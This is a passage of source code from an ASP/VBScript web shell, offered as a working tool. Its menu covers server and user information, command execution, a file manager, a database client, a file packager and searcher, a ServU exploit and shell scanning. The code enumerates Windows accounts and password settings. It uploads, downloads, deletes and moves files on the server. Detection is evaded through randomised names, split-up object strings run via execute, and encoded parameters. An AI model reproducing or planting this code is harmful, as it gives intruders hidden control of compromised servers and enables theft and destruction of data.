form1.vdgad.value="<%=jwv("")%>"&dbpath
End Function
Function nvlql()
'On Error Resume Next
Dim zax,nspwd
Set nspwd=new RegExp
nspwd.Global=True
nspwd.IgnoreCase=True
nspwd.MultiLine=True
nspwd.Pattern="^((\d+|.)<%=iul%>)+(\d+|.)$"
For Each subForm In Document.Forms
For Each zax In subForm.Elements
If InStr("|<%=xkur%>|","|"&zax.id&"|")>0 And nspwd.Test(zax.value)Then zax.value=fkv(zax.value)
Next
Next
End Function
Function fkv(toq)
If Not <%=skw%> Or toq=""Then
fkv=toq
Exit Function
End If
Dim dd,yfwim
dd=""
yfwim=Split(toq,"<%=iul%>")
For i=0 To UBound(yfwim)
If IsNumeric(yfwim(i))Then
dd=dd&Chr(CInt(yfwim(i))-<%=aal%>)
Else
dd=dd&yfwim(i)
End If
Next
fkv=dd
End Function
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#f9f9f9">
<table width="100%"border="0"cellpadding="0"cellspacing="0">
<tr class="head">
<td style="width:30%"><br><%=ids("LOCAL_ADDR")&"("&vmycc&")"%></td>
<td align="center" style="width:40%"><br>
<b><%qzlnh ajvx,"#0099FF","3"%></b><br>
</td>
<td style="width:30%"align="right"><%=zajt()%></td>
</tr>
<form id="actForm"method="post"action="<%=crk%>">
<input type="hidden" id="goaction" name="goaction" value="">
<input type="hidden" id="wkfvm" name="wkfvm" value="">
<input type="hidden" id="dpqnl" name="dpqnl" value="">
</form>
<form id="sqlForm"method="post"action="<%=crk%>">
<input type="hidden" id="goaction" name="goaction" value="bbd">
<input type="hidden" id="wkfvm" name="wkfvm" value="">
<input type="hidden" id="vdgad" name="vdgad" value="<%=vdgad%>">
<input type="hidden" id="npkn" name="npkn" value="">
<input type="hidden" id="ouo" name="ouo" value="">
<input type="hidden" id="lrmn" name="lrmn" value="">
</form>
<%
If prlq Then
%>
<tr class="link">
<td colspan="3">
<a href="javascript:xzs('jznyg','','');">Server Info</a> | 
<a href="javascript:xzs('lgg','','');">Object Info</a> | 
<a href="javascript:xzs('fqx','','');">User Info</a> | 
<a href="javascript:xzs('uvu','','');">C-S Info</a> | 
<a href="javascript:xzs('cfxwz','','');">WS Execute</a> | 
<a href="javascript:xzs('bjz','','');">FSO File</a> | 
<a href="javascript:xzs('aeta','','');">App File</a> | 
<a href="javascript:xzs('bbd','','');">DataBase</a> | 
<a href="javascript:xzs('zep','','');">File Packager</a> | 
<a href="javascript:xzs('croia','','');">File Searcher</a> | 
<a href="javascript:xzs('ueouq','','');">ServU Exp</a> | 
<a href="javascript:xzs('oplmw','','');">Scan Shells</a> | 
<a href="javascript:xzs('yauzx','','');">Some Others...</a> | 
<a href="javascript:xzs('Logout','','');">Logout</a> | 
<a href="javascript:nvlql();">Decode</a>
</td>
</tr>
<%
End If
%></table><div class="main"><br>
<%
echo"<b>"
qzlnh pufyf&"&raquo;","#0099ff","2"
prj"</b><br><br>"
End Sub
Sub jab()
Dim vgas
vgas=snqsz(ids("PATH_INFO"),"/",False)
echo pifbx("http://"&vmycc&vgas&"/"&cwzd&"?"&ids("QUERY_STRING"),"GET")
Response.status=jcy.status
response.End
End Sub
Sub sikc(kvqdq,eazb)
Dim ojk
If Not gdzvu Then On Error Resume Next
echo"<li><u>"&kvqdq
If eazb<>""Then
echo"(Object "&eazb&")"
End If
echo"</u>"
If Err Then Err.Clear
Set ojk=wannd(kvqdq)
If Err Then
qzlnh uhu("Disabled"),"red",""
Else
qzlnh uhu("Enabled  "),"green",""
echo"Version:"&ojk.Version&";"
echo"About:"&ojk.About
End If
echo"</li>"
If Err Then Err.Clear
Set ojk=Nothing
End Sub
Sub ejh(vhl)
Dim User,mig,wiz
If Not gdzvu Then On Error Resume Next
Set User=getObj("WinNT://./"&vhl&",user")
mig=User.Get("UserFlags")
wiz=User.LastLogin
mypdl 0
doTd"Description","20%"
doTd User.Description,"80%"
jwwxg
mypdl 1
doTd"Belong to",""
doTd lgwn(vhl),""
jwwxg
mypdl 0
doTd"Password expired","20%"
doTd CBool(User.Get("Passw"&toqz&"ordExpired")),"80%"
jwwxg
mypdl 1
doTd"Password never expire",""
doTd cbool(mig And&H10000),""
jwwxg
mypdl 0
doTd"Can't change password",""
doTd cbool(mig And&H00040),""
jwwxg
mypdl 1
doTd"Global-group account",""
doTd cbool(mig And&H100),""
jwwxg
mypdl 0
doTd"Password length at least",""
execute "doTd User.PasswordM"&tnsaq&"inimumLength,"""""
jwwxg
mypdl 1
doTd"Password required",""
doTd User.PasswordRequired,""
jwwxg
mypdl 0
doTd"Account disabled",""
execute "doTd User.Acco"&vzm&"untDisabled,"""""
jwwxg
mypdl 1
doTd"Account locked",""
execute "doTd User.IsAccount"&cfxwl&"Locked,"""""
jwwxg
mypdl 0
doTd"User profile",""
doTd User.Profile,""
jwwxg
mypdl 1
doTd"User loginscript",""
doTd User.LoginScript,""
jwwxg
mypdl 0
doTd"Home directory",""
doTd User.HomeDirectory,""
jwwxg
mypdl 1
doTd"Home drive",""
doTd User.Get("HomeD"&qzyl&"irDrive"),""
jwwxg
mypdl 0
doTd"Last login",""
doTd wiz,""
jwwxg
If Err Then Err.Clear
End Sub
Function lgwn(vhl)
Dim kns,zoiz
Set kns=getObj("WinNT://./"&vhl&",user")
For Each zoiz in kns.Groups
lgwn=lgwn&" "&zoiz.Name
Next
End Function
Function luuh(wjiy)
execute "Set objCountFile=cfho.OpenT"&uaucr&"extFile(wjiy,1,True)"
execute "luuh=Replace(objCountFile.ReadA"&fstp&"ll,Chr(0),"" "")"
objCountFile.Close
Set objCountFile=Nothing
End Function
Function ksfhb(wjiy)
If Not gdzvu Then On Error Resume Next
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
With xbo
.Type=2
.Mode=3
.Open
.LoadFromFile wjiy
If wkfvm="uen" Then
.CharSet="utf-8"
Else
.CharSet=tbq
End If
.Position=2
ksfhb=Replace(.ReadText(),Chr(0)," ")
.Close
End With
Set xbo=Nothing
End Function
Sub ewi(wjiy,aunk,lxqjg)
If Not gdzvu Then On Error Resume Next
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
With xbo
.Type=lxqjg
.Mode=3
.Open
If wkfvm="kcbe"Then
.CharSet="utf-8"
ElseIf wkfvm="Save"Then
.CharSet=tbq
End If
If lxqjg=2 Then
.WriteText aunk
Else
.Write aunk
End If
execute "xbo.S"&icve&"avetoFile wjiy,2"
.Close
End With
Set xbo=Nothing
End Sub
Sub pjby(wjiy,aunk)
Dim theFile
execute "Set theFile=cfho.Ope"&trwh&"nTextFile(wjiy,2,True)"
theFile.Write aunk
theFile.Close
Set theFile=Nothing
End Sub
Sub cnd()
If Not gdzvu Then On Error Resume Next
If kbcx="file"Then
wjiy=wjiy&"\"&qbh
execute "Call cfho.Creat"&nond&"eTextFile(wjiy,False)"
omt
Else
execute "cfho.CreateFol"&npj&"der(wjiy&""\""&qbh)"
End If
If Err Then
byv(Err)
Else
jdvsp"File/folder created"
End If
End Sub
Sub wstda()
Dim jxgez,ydqp,crlct,zgaf
If Not gdzvu Then On Error Resume Next
wjiy=snqsz(dpqnl,"|",False)
jxgez=aiy(dpqnl,"|")
If InStr(wjiy,"\")<1 Then wjiy=wjiy&"\"
Dim theFile,fileName,theFolder
If wjiy=""Or jxgez=""Then
jdvsp"Parameter wrong!"
Exit Sub
End If
If jbn="fso"Then
If wkfvm="renamefolder"Then
Set theFolder=cfho.GetFolder(wjiy)
theFolder.Name=jxgez
Set theFolder=Nothing
Else
Set theFile=cfho.GetFile(wjiy)
theFile.Name=jxgez
Set theFile=Nothing
End If
Else
zgaf=aiy(wjiy,"\")
crlct=snqsz(wjiy,"\",False)
execute "Set ydqp=zaydb.Nam"&mby&"eSpace(crlct)"
Set ief=ydqp.ParseName(zgaf)
ief.Name=jxgez
End If
If Err Then
byv(Err)
Else
jdvsp"Rename completed"
End If
End Sub
Sub lbhn()
If Not gdzvu Then On Error Resume Next
If wkfvm="ohp"Then
execute "Call cfho.D"&wwv&"eleteFolder(wjiy,True)"
Else
execute "Call cfho.DeleteFi"&ihk&"le(wjiy,True)"
End If
If Len(wjiy)=2 Then wjiy=wjiy&"\"
If Err Then
byv(Err)
Else
jdvsp"File/folder deleted"
End If
End Sub
Sub xms()
Dim dirsq,tzhl,zptv,mbuem,rtym
If Not gdzvu Then On Error Resume Next
wjiy=Left(dpqnl,Instr(dpqnl,"|")-1)
tzhl=Mid(dpqnl,InStr(dpqnl,"|")+1)
If wjiy=""Or tzhl=""Then
jdvsp"Parameter wrong!"
Exit Sub
End If
Select Case wkfvm
Case"ehwr"
execute "Call cfho.Co"&tqnx&"pyFolder(wjiy,tzhl)"
Case"wkicu"
execute "Call cfho.Copy"&yhfz&"File(wjiy,tzhl)"
Case"cmhk"
execute "Call cfho.MoveF"&zla&"older(wjiy,tzhl)"
Case"okio"
echo wjiy&"||"&tzhl
execute "Call cfho.Move"&agzh&"File(wjiy,tzhl)"
End Select
If Err Then
byv(Err)
Else
jdvsp"File/folder copyed/moved"
End If
End Sub
Sub qxb()
Dim rfeef,cey,btt,aum
If Not gdzvu Then On Error Resume Next
wjiy=Left(dpqnl,Instr(dpqnl,"|")-1)
If Right(wjiy,1)="\"And Len(wjiy)>3 Then wjiy=Left(wjiy,Len(wjiy)-1)
cey=aiy(wjiy,"\")
btt=Mid(dpqnl,Instr(dpqnl,"|")+1)
wjiy=snqsz(wjiy,"\",False)
execute "Set aum=zaydb.N"&mpe&"ameSpace(wjiy)"
Set rfeef=aum.ParseName(cey)
If btt<>""Then
If IsDate(btt) Then rfeef.ModIfyDate=btt
End If
If Err Then
byv(Err)
Else
jdvsp"Time modIffied"
End If
Set rfeef=Nothing
Set aum=Nothing
End Sub
Sub ijv()
Response.Clear
If Not gdzvu Then On Error Resume Next
Dim fileName,scms
fileName=aiy(wjiy,"\")
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
xbo.Open
xbo.Type=1
execute "xbo.Load"&cork&"FromFile(wjiy)"
byv(Err)
Session.CodePage=936
Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
Session.CodePage=65001
Response.AddHeader"Content-Length",xbo.Size
Response.ContentType="Application/Octet-Stream"
Response.BinaryWrite xbo.Read
Response.Flush()
xbo.Close
Set xbo=Nothing
End Sub
Class upload_5xsoft
Dim cth,qay
Public Function Form(azrn)
azrn=Lcase(azrn)
If Not cth.exists(azrn) Then
Form=""
Else
Form=cth(azrn)
End If
End Function
Public Function File(strFile)
If Not gdzvu Then On Error Resume Next
strFile=Lcase(strFile)
If not qay.exists(strFile) Then
Set File=new FileInfo
Else
Set File=qay(strFile)
End If
End Function
Private Sub Class_Initialize
If Not gdzvu Then On Error Resume Next
Dim egmt,ujp,vbCrlf,ipf,fwl,badig,cxnes,mmzz,theFile
Dim jwys,vnzn,mfcyi,zvhy,wxhe
Dim pel,god
Dim efd,vovza,bfi
Set cth=wannd("Scrip"&dlbgc&"ting.Dictionary")
Set qay=wannd("Scrip"&dlbgc&"ting.Dictionary")
If Request.TotalBytes<1 Then Exit Sub
Set cxnes=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
xbo.Type=1
xbo.Mode=3
xbo.Open
xbo.Write Request.BinaryRead(Request.TotalBytes)
xbo.Position=0
egmt=xbo.Read
efd=1
vovza=LenB(egmt)
vbCrlf=chrB(13)&chrB(10)
ujp=MidB(egmt,1,InStrB(efd,egmt,vbCrlf)-1)
mmzz=LenB(ujp)
efd=efd+mmzz+1
While(efd+10)<vovza 
badig=InStrB(efd,egmt,vbCrlf & vbCrlf)+3
cxnes.Type=1
cxnes.Mode=3
cxnes.Open
xbo.Position=efd
xbo.CopyTo cxnes,badig-efd
cxnes.Position=0
cxnes.Type=2
cxnes.CharSet="gb2312"
ipf=cxnes.ReadText
cxnes.Close
efd=InStrB(badig,egmt,ujp)
pel=InStr(22,ipf,"name=""",1)+6
god=InStr(pel,ipf,"""",1)
bfi=Lcase(Mid(ipf,pel,god-pel))
If InStr(45,ipf,"filename=""",1) > 0 Then
Set theFile=new FileInfo
pel=InStr(god,ipf,"filename=""",1)+10
god=InStr(pel,ipf,"""",1)
wxhe=Mid(ipf,pel,god-pel)
theFile.FileName=faqhv(wxhe)
theFile.FilePath=orj(wxhe)
theFile.yjr=glv(wxhe)
pel=InStr(god,ipf,"Content-Type: ",1)+14
god=InStr(pel,ipf,vbCr)
theFile.FileType =Mid(ipf,pel,god-pel)
theFile.gstqc =badig
theFile.FileSize=efd-badig-3
theFile.ujdu=bfi
If not qay.Exists(bfi)Then
qay.add bfi,theFile
End If
Else
cxnes.Type =1
cxnes.Mode =3
cxnes.Open
xbo.Position=badig 
xbo.CopyTo cxnes,efd-badig-3
cxnes.Position=0
cxnes.Type=2
cxnes.CharSet ="gb2312"
zvhy=cxnes.ReadText 
cxnes.Close
If cth.Exists(bfi) Then
cth(bfi)=cth(bfi)&","&zvhy
Else
cth.Add bfi,zvhy
End If
End If
efd=efd+mmzz+1
wEnd
egmt=""
Set cxnes =nothing
End Sub
Private Sub Class_Terminate
If Not gdzvu Then On Error Resume Next
If Request.TotalBytes>0 Then
cth.RemoveAll
qay.RemoveAll
Set cth=nothing
Set qay=nothing
xbo.Close
Set xbo =nothing
End If
End Sub
Private Function orj(ehlw)
If Not gdzvu Then On Error Resume Next
If ehlw<>"" Then
orj=left(ehlw,InStrRev(ehlw,"\"))
Else
orj=""
End If
End Function
Private Function glv(ehlw)
If ehlw<>"" Then
glv=mid(ehlw,InStrRev(ehlw,".")+1)
Else
glv=""
End If
End Function
Private Function faqhv(ehlw)
If ehlw<>"" Then
faqhv=mid(ehlw,InStrRev(ehlw,"\")+1)
Else
faqhv=""
End If
End Function
End Class
Class FileInfo
Dim ujdu,FileName,FilePath,FileSize,yjr,FileType,gstqc
Private Sub Class_Initialize 
FileName=""
FilePath=""
FileSize=0
gstqc= 0
ujdu=""
FileType=""
yjr= ""
End Sub
Public Function ppco(ehlw)
Dim dr,yqbgf,i
ppco=True
If Trim(ehlw)="" or gstqc=0 or FileName="" or Right(ehlw,1)="/" Then exit Function
Set dr=CreateObject("Ad"&rgc&"odb.St"&jgcbg&"ream")
dr.Mode=3
dr.Type=1
dr.Open
xbo.position=gstqc
xbo.copyto dr,FileSize
execute "dr.SavetoFi"&vbxja&"le ehlw,2"
dr.Close
Set dr=nothing 
ppco=False
End Function
Public Function mzn()
xbo.position=gstqc
mzn=xbo.Read(FileSize)
End Function
End Class
Sub myccq()
If Not gdzvu Then On Error Resume Next
If wjiy="" Then wjiy=vuv
If InStr(wjiy,":")<1 Then wjiy=vuv&"\"&wjiy
Set theFile=ars.File("upfile")
If qaxei="" Then qaxei=theFile.FileName
theFile.ppco(wjiy&"\"&qaxei)
If Err Then
byv(Err)
Else
jdvsp("Upload Sucess")
End If
End Sub
Function pifbx(qean,method)
If Not gdzvu Then On Error Resume Next
Dim mgy
If method="POST" Then
mgy=Split(qean,"?")(1)
qean=Split(qean,"?")(0)
End If
jcy.Open method,qean,False
If method="POST" Then
jcy.SetRequestHeader"Content-Type","application/x-www-form-urlencoded"
jcy.send mgy
Else
jcy.send
End If
If mox(jcy.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
pagecharSet=Trim(dwqgl(cfv(jcy.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
ElseIf mox(jcy.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
pagecharSet=Trim(dwqgl(cfv(jcy.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
End If
If pagecharSet=""Then pagecharSet=tbq
pifbx=sha(jcy.responseBody,pagecharSet)
End Function
Function cyjn()
If Request.Cookies(ysktq)=""Then
cyjn=False
Exit Function
End If
If qiep(Request.Cookies(ysktq))=pass Then
cyjn=True
Else
cyjn=False
End If
End Function
Function xppp(pamToEn)
If Not skw Or pamToEn=""Then
xppp=pamToEn
Exit Function
End If
Dim tt,uxond
tt=""
For i=1 To Len(pamToEn)
uxond=Mid(pamToEn,i,1)
If Asc(uxond)<128 And Asc(uxond)>0 Then
tt=tt&Asc(uxond)+aal&iul
Else
tt=tt&uxond&iul
End If
Next
xppp=Left(tt,Len(tt)-1)
End Function
Function fkv(toq)
If Not skw Or toq="" Or Not mox(toq,"^((\d+|.)"&iul&")+(\d+|.)$")Then
fkv=toq
Exit Function
End If
Dim dd,yfwim
dd=""
yfwim=Split(toq,iul)
For i=0 To UBound(yfwim)
If IsNumeric(yfwim(i))Then
dd=dd&Chr(CInt(yfwim(i))-aal)
Else
dd=dd&yfwim(i)
End If
Next
fkv=dd
End Function
Function zajt()
Dim sont,cfu,rak
cfu=88
rak=31
sont="<br>"
sont=sont&"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | "
sont=sont&"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | "
sont=sont&"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | "
sont=sont&"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>"
zajt=sont
End Function
Function sha(jdj,gmvw)
If Not gdzvu Then On Error Resume Next
Dim iyrl,mkpat
Set iyrl=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
With iyrl
.Type=2
.Open
.WriteText jdj
.Position=0
.CharSet=gmvw
.Position=2
mkpat=.ReadText(.Size)
.close
End With
Set iyrl=Nothing
sha=mkpat
End Function
Function ids(str)
ids=Request.ServerVariables(str)
End Function
Function wannd(flit)
Set wannd=Server.CreateObject(flit)
End Function
Function getObj(flit)
Set getObj=GetObject(flit)
End Function
Function lcbr(str)
lcbr=server.urlencode(str)
End Function
Function tbe(str)
Dim fsrh,phg
fsrh=""
For i=0 To Len(str)-1
phg=Right(str,Len(str)-i)
If Asc(phg)<16 Then fsrh=fsrh&"0"
fsrh=fsrh&CStr(Hex(Asc(phg)))
Next
tbe="0x"&fsrh
End Function
Function jnbm(str)
Dim fsrh,phg
fsrh=""
For i=0 To Len(str)-1
phg=Right(str,Len(str)-i)
fsrh=fsrh&CStr(Hex(Asc(phg)))&"00"
Next
jnbm="0x"&fsrh
End Function
Function uhu(str)
str=trubs(str)
str=Replace(str,Chr(13)&Chr(10),"<br>")
uhu=Replace(str," ","&nbsp;")
End Function
Function trubs(str)
If Not gdzvu Then On Error Resume Next
str=CStr(str)
If IsNull(str)Or str=""Then
trubs=""
Exit Function
End If
trubs=Server.HtmlEncode(str)
End Function
Function iiju(str)
iiju=Server.MapPath(str)
End Function
Sub byv(Err)
If Err Then
jdvsp"Exception :"&Err.Description
jdvsp"Exception source :"&Err.Source
Err.Clear
End If
End Sub
Function qiep(ByVal CodeStr) 
Dim oygic 
Dim ftdy 
Dim zlmjh 
oygic=30 
ftdy=oygic-Len(CodeStr) 
If Not ftdy<1 Then 
For cecr=1 To ftdy 
CodeStr=CodeStr&Chr(21) 
Next 
End If 
zlmjh=1 
Dim Ben 
For cecb=1 To oygic 
Ben=oygic+Asc(Mid(CodeStr,cecb,1)) * cecb 
zlmjh=zlmjh * Ben 
Next 
CodeStr=zlmjh 
zlmjh=Empty 
For cec=1 To Len(CodeStr) 
zlmjh=zlmjh&xsgp(Mid(CodeStr,cec,3)) 
Next 
For cec=20 To Len(zlmjh)-18 Step 2 
qiep=qiep&Mid(zlmjh,cec,1) 
Next 
End Function 
Function xsgp(word) 
For cc=1 To Len(word) 
xsgp=xsgp&Asc(Mid(word,cc,1)) 
Next 
xsgp=Hex(xsgp) 
End Function 
Function ilnuo(byfm)
If byfm>=(1024 * 1024 * 1024)Then ilnuo=Fix((byfm /(1024 * 1024 * 1024))* 100)/ 100&"G"
If byfm>=(1024 * 1024)And byfm<(1024 * 1024 * 1024)Then ilnuo=Fix((byfm /(1024 * 1024))* 100)/ 100&"M"
If byfm>=1024 And byfm<(1024 * 1024)Then ilnuo=Fix((byfm / 1024)* 100)/ 100&"K"
If byfm>=0 And byfm<1024 Then ilnuo=byfm&"B"
End Function
Function jzf(num)
Select Case num
Case 0
jzf="Unknown"
Case 1
jzf="Removable"
Case 2
jzf="Local drive"
Case 3
jzf="Net drive"
Case 4
jzf="CD-ROM"
Case 5
jzf="RAM disk"
End Select
End Function
Function omrpv(ByVal str)
str=Replace(str,"\","\\")
omrpv=Replace(str,"\\\\","\\")
End Function
Function jwv(str)
jwv="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&str
End Function
Function snqsz(str,eox,sef)
If str="" Or InStr(str,eox)<1 Then
snqsz=""
Exit Function
End If
If sef Then
snqsz=Left(str,InStr(str,eox)-1)
Else
snqsz=Left(str,InstrRev(str,eox)-1)
End If
End Function
Function aiy(str,eox)
If str="" Or InStr(str,eox)<1 Then
aiy=""
Exit Function
End If
aiy=Mid(str,InstrRev(str,eox)+Len(eox))
End Function
Sub echo(str)
Response.Write str
End Sub
Sub prj(str)
echo str&vbCrLf
End Sub
Sub slv(flit,dctwz)
echo"<a href='#' onClick=""javascript:aac("&flit&")"" id='"&flit&"href' class='hidehref'>"&flit&" :</a>"
echo"<span id="&flit
If dctwz Then echo" style='display:none;'"
prj">"
End Sub
Sub fach(latdl,wkfvm,vvvw,tvou,rgbdm)
prj"<a href=""javascript:xzs('"&latdl&"','"&wkfvm&"','"&vvvw&"')"">"&tvou&"</a>"&rgbdm
End Sub
Sub tcpp(wkfvm,vdgad,npkn,kkkvp,lrmn,tvou,rgbdm)
prj"<a href=""javascript:vbx('"&wkfvm&"','"&vdgad&"','"&npkn&"','"&kkkvp&"','"&lrmn&"')"">"&tvou&"</a>"&rgbdm
End Sub
Sub qzlnh(str,color,size)
echo"<font color="""&color&""""
If size<>""Then echo" size="""&size&""""
prj">"&str&"</font>"
End Sub
Sub skkkw(width)
prj"<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
End Sub
Sub iroyi()
prj"</table>"
End Sub
Sub mypdl(num)
echo"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
End Sub
Sub wuosu()
echo"<tr class='link'>"
End Sub
Sub cvdty(num)
echo"<span class='alt"&num&"Span'>"
End Sub
Sub usxip(flit,dctwz)
echo"<span id="&flit
If dctwz Then echo" style='display:none;'"
prj">"
End Sub
Sub pppf(needEn)
echo"<form method=""post"" id=""form"&qhgjo&""" action="""&crk&""""
If needEn Then echo" onSubmit=""javascript:vnwt('form"&qhgjo&"')"""
prj">"
olisd"goaction",goaction
qhgjo=qhgjo+1
End Sub
Sub xpor()
prj"</form>"
End Sub
Sub ckzt(value,width)
echo"<td style=""width:"&width&""">"
echo"<input type=""submit"" value="""&value&""" class=""bt"">"
prj"</td>"
End Sub
Sub aoz(str,color,size)
echo"<td>"
qzlnh str,color,size
prj"</td>"
End Sub
Sub jwwxg()
prj"</tr>"
End Sub
Sub doTd(td,width)
If td=""Or IsNull(td)Then td="<font color=""red"">Null</font>"
echo"<td"
If width<>""Then echo" width='"&width&"'"
echo">"
echo CStr(td)
prj"</td>"
End Sub
Sub vots(agc,name,value,size,rgbdm)
Dim cls
If agc="button"Or agc="submit"Or agc="reSet"Then
cls="bt"
Else
cls="input"
End If
echo"<input type="""&agc&""" name="""&name&""" id="""&name&""" value="""&trubs(value)&""" size="""&size&""" class="""&cls&""" "&rgbdm&"/>"
End Sub
Sub rfc(name,value,rnxi,rgbdm)
vots"checkbox",name,value,"",rgbdm
echo"<label class=""lbl"" for="""&name&""">"&rnxi&"</label>"
End Sub
Sub olisd(name,value)
prj"<input type=""hidden"" name="""&name&""" id="""&name&""" value="""&value&""">"
End Sub
Sub gsj(agc,name,value,width,rgbdm,span)
Dim cls
If agc="button"Or agc="submit"Or agc="reSet"Then
cls="bt"
Else
cls="tdInput"
End If
If span=""Then span=1
echo"<td colspan="&span&" style=""width:"&width&""">"
echo"<input type="""&agc&""" name="""&name&""" id="""&name&""" value="""&trubs(value)&""" class="""&cls&""" "&rgbdm&">"
prj"</td>"
End Sub
Sub xzs(value)
prj"<input type=""submit"" value="""&value&""" class=""bt"">"
End Sub
Sub wdjc(name,value,rows)
echo"<td>"
bgr name,value,"100%",rows," class=""tdText"""
prj"</td>"
End Sub
Sub agb(str)
If Not gdzvu Then On Error Resume Next
If IsObject(str)Or IsNull(str)Or str="" Then str="<font color=red>Null<font>"
echo"<td nowrap>"&str&"</td>"
End Sub
Sub bgr(name,value,width,rows,rgbdm)
echo"<textarea name="""&name&""" id="""&name&""" style=""width:"&width&";"" rows="""&rows&""" class=""text"" "&rgbdm&">"
echo trubs(value)
prj"</textarea>"
End Sub
Sub rwxiy()
echo"<ul class=""info"">"
End Sub
Sub arqt(name,width,rgbdm)
prj"<select style=""width:"&width&""" name="""&name&""" "&rgbdm&">"
End Sub
Sub iesnd()
prj"</select>"
End Sub
Sub isbb(value,str)
prj"<option value="""&value&""">"&str&"</option>"
End Sub
Sub cdama()
mtz=mtz+1
If mtz>=2 Then mtz=0
End Sub
Sub zlpp(str)
prj"<label>"&str&"</label>"
End Sub
Sub jdvsp(str)
juaw=juaw&"<li>"&str&"</li>"
End Sub
Sub jplxa(Err)
If Err Then
byv(Err)
okxls
End If
End Sub
Function mox(str,sevj)
dhk.Pattern=sevj
mox=dhk.Test(str)
End Function
Function cfv(str,sevj,scau)
If scau Then sevj=vtyjc(sevj)
dhk.Pattern=sevj
Set cfv=dhk.Execute(str)
End Function
Function dwqgl(str,sevj,biohq,scau)
If scau Then sevj=vtyjc(sevj)
dhk.Pattern=sevj
dwqgl=dhk.Replace(str,biohq)
End Function
Function vtyjc(str)
str=Replace(str,"\","\\")
str=Replace(str,".","\.")
str=Replace(str,"?","\?")
str=Replace(str,"+","\+")
str=Replace(str,"(","\(")
str=Replace(str,")","\)")
str=Replace(str,"*","\*")
str=Replace(str,"[","\[")
str=Replace(str,"]","\]")
vtyjc=str
End Function
%>
